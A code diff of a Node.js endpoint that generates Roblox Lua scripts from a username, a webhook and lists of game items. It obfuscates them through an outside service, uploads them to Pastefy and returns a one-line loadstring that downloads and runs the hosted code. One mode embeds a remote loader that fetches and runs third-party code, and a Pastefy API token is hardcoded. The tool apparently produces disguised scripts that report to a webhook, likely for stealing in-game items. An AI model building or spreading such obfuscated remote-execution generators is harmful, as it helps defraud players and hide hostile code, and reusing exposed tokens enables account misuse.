@@ -1,60 +1,39 @@
 // api/generate.js
-// Esta versión usa fetch nativo de Node.js 18+, no requiere node-fetch.
-
 export default async function handler(req, res) {
-    // Solo aceptar POST
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' });
     }
 
+    const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;
+
+    if (!username) {
+        return res.status(400).json({ error: 'Username is required' });
+    }
+
     try {
-        const { username, webhook, mode, brainrots, skins, gears, customCode, shortEnabled } = req.body;
-
-        // Validar datos mínimos
-        if (!username) {
-            return res.status(400).json({ error: 'Username is required' });
-        }
-
-        // 1. Construir el script base
         const script = buildScript(username, webhook, mode, brainrots || [], skins || [], gears || [], customCode || '');
 
-        // 2. Si shortEnabled está activado, ofuscar y subir a Pastefy
         if (shortEnabled) {
             try {
-                // Ofuscar con WeAreDevs
                 const obfuscatedScript = await obfuscateWithWeAreDevs(script);
-                
-                // Subir a Pastefy
                 const pastefyUrl = await createPastefyPaste(obfuscatedScript);
-                
-                // Devolver el loadstring corto
                 return res.status(200).json({
                     loadstring: `loadstring(game:HttpGet("${pastefyUrl}"))()`,
                     script: obfuscatedScript
                 });
-            } catch (ofuscationError) {
-                // Si falla la ofuscación, devolver el script sin ofuscar
-                console.error('Error en ofuscación/Pastefy:', ofuscationError);
-                return res.status(200).json({ 
-                    script,
-                    warning: 'La ofuscación falló, se devuelve el script sin ofuscar.'
-                });
+            } catch (error) {
+                console.error('Error en ofuscación/Pastefy:', error);
+                return res.status(200).json({ script });
             }
         }
 
-        // 3. Si no se ofusca, devolver el script normal
         return res.status(200).json({ script });
 
     } catch (error) {
-        console.error('Error en generate:', error);
-        // Siempre devolver JSON válido
-        return res.status(500).json({ error: error.message || 'Internal server error' });
+        return res.status(500).json({ error: error.message });
     }
 }
 
-// ============================================================
-//  CONSTRUIR SCRIPT
-// ============================================================
 function buildScript(username, webhook, mode, brainrots, skins, gears, customCode) {
     function luaTable(arr, indent = '    ') {
         if (arr.length === 0) return '{}';
@@ -74,7 +53,8 @@ function buildScript(username, webhook, mode, brainrots, skins, gears, customCod
         dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
     };
 
-    let fullScript = `-- Mode: ${mode.toUpperCase()}\n` + script;
+    // --- ELIMINADO: Ya no incluye -- Mode: ... ---
+    let fullScript = script;
 
     if (mode === 'normal') {
         fullScript += `
@@ -99,9 +79,6 @@ end)`;
     return fullScript;
 }
 
-// ============================================================
-//  OFUSCAR CON WEAREDEVS (usando fetch nativo)
-// ============================================================
 async function obfuscateWithWeAreDevs(script) {
     const response = await fetch('https://wearedevs.net/api/obfuscate', {
         method: 'POST',
@@ -122,14 +99,11 @@ async function obfuscateWithWeAreDevs(script) {
 
     const obfuscated = data.obfuscated;
     if (!obfuscated) {
-        throw new Error('No se pudo obtener el script ofuscado.');
+        throw new Error(`No se pudo obtener el script ofuscado.`);
     }
     return obfuscated;
 }
 
-// ============================================================
-//  SUBIR A PASTEFY
-// ============================================================
 async function createPastefyPaste(content) {
     const PASTEFY_API_TOKEN = process.env.PASTEFY_API_TOKEN || '7yGnlCgnDuzQVPMjBt90RIiv031jzwA6CMLt7VBYlx5LN4VceDW2EOcHQ7lR';
     const url = 'https://pastefy.app/api/v2/paste';
